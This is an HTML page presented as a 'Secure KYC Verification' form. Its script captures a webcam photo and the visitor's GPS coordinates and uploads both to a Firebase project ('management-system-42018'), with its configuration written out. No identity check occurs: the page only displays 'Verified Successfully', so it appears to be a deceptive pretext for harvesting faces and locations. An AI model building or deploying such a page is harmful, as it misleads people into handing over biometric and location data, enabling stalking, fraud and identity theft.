<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure KYC Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --rp-blue: #3395ff;
            --rp-success: #2ecc71;
            --rp-text: #1f2c3d;
            --rp-bg: #f5f8fa;
        }

        body { 
            font-family: 'Mulish', sans-serif; 
            background-color: var(--rp-bg); 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; margin: 0; 
        }

        .card { 
            background: white; padding: 40px; border-radius: 4px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
            width: 100%; max-width: 400px; text-align: center;
            border-top: 5px solid var(--rp-blue);
            transition: all 0.5s ease;
        }

        .card.verified { border-top-color: var(--rp-success); }
        
        /* Success Animation */
        .success-icon { 
            display: none; font-size: 60px; color: var(--rp-success); 
            margin-bottom: 20px; animation: scaleUp 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        @keyframes scaleUp { from { transform: scale(0); } to { transform: scale(1); } }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 18px; height: 18px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        h2 { font-weight: 700; font-size: 22px; margin-top: 0; color: var(--rp-text); }
        p { color: #51596c; font-size: 14px; margin-bottom: 20px; }

        .btn-content { display: flex; align-items: center; justify-content: center; }

        button { 
            background: var(--rp-blue); color: white; border: none; 
            padding: 14px; border-radius: 2px; font-weight: 700;
            width: 100%; cursor: pointer; text-transform: uppercase;
            letter-spacing: 1px; transition: 0.2s;
        }

        button:disabled { background: #7fbfff; cursor: not-allowed; }

        #webcam { width: 100%; border-radius: 4px; margin-bottom: 20px; display: none; transform: scaleX(-1); background: #000; }
        .status-box { margin-top: 20px; font-size: 11px; color: #888; text-align: left; background: #f9f9f9; padding: 12px; border: 1px solid #eee; border-radius: 4px; }
        canvas { display: none; }
    </style>
</head>
<body>

<div class="card" id="kyc-card">
    <div id="success-tick" class="success-icon">✓</div>
    <h2 id="title">Identity Verification</h2>
    <p id="desc">Secure biometric and location check.</p>
    
    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    
    <button id="main-btn">
        <span class="btn-content">
            <span class="spinner" id="loader"></span>
            <span id="btn-text">Start Verification</span>
        </span>
    </button>

    <div class="status-box" id="log"><b>SYSTEM STATUS:</b> Awaiting Action</div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyDiuJzAE0cPsyIFP4AbOhMogCYYMveYWs0",
  authDomain: "management-system-42018.firebaseapp.com",
  databaseURL: "https://management-system-42018-default-rtdb.firebaseio.com",
  projectId: "management-system-42018",
  storageBucket: "management-system-42018.firebasestorage.app",
  messagingSenderId: "54905325970",
  appId: "1:54905325970:web:d904a020fc8ca66fa2d94b"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const storage = firebase.storage();

    const btn = document.getElementById('main-btn');
    const btnText = document.getElementById('btn-text');
    const loader = document.getElementById('loader');
    const log = document.getElementById('log');
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const card = document.getElementById('kyc-card');
    
    let userLocation = { lat: "Not Captured", lon: "Not Captured" };
    let step = 1;

    btn.addEventListener('click', async () => {
        if (step === 1) {
            handlePermissions();
        } else {
            handleUpload();
        }
    });

    async function handlePermissions() {
        log.innerHTML = "<b>Status:</b> Initializing...";
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(pos => {
                userLocation.lat = pos.coords.latitude;
                userLocation.lon = pos.coords.longitude;
                log.innerHTML += `<br>✅ GPS Locked`;
            });
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            video.style.display = "block";
            btnText.innerText = "Capture & Upload";
            step = 2;
        } catch (e) {
            log.innerHTML += `<br>❌ Camera Error: ${e.message}`;
        }
    }

    async function handleUpload() {
        // Show Spinner
        btn.disabled = true;
        loader.style.display = "inline-block";
        btnText.innerText = "Processing...";
        
        const context = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
            const fileName = `kyc_${Date.now()}.jpg`;
            const storageRef = storage.ref().child(`kyc_photos/${fileName}`);

            try {
                const snapshot = await storageRef.put(blob);
                const photoURL = await snapshot.ref.getDownloadURL();

                await db.collection("kyc_verifications").add({
                    photoUrl: photoURL,
                    latitude: userLocation.lat,
                    longitude: userLocation.lon,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });

                showSuccess();
            } catch (error) {
                log.innerHTML += `<br>❌ Error: ${error.message}`;
                btn.disabled = false;
                loader.style.display = "none";
                btnText.innerText = "Retry Capture";
            }
        }, 'image/jpeg', 0.8);
    }

    function showSuccess() {
        video.style.display = "none";
        btn.style.display = "none";
        document.getElementById('success-tick').style.display = "block";
        document.getElementById('title').innerText = "Verified Successfully";
        document.getElementById('desc').innerText = "Data synced to secure servers.";
        card.classList.add('verified');
        log.innerHTML = "<b>Final Status:</b> Verified";
    }
</script>

</body>
</html>
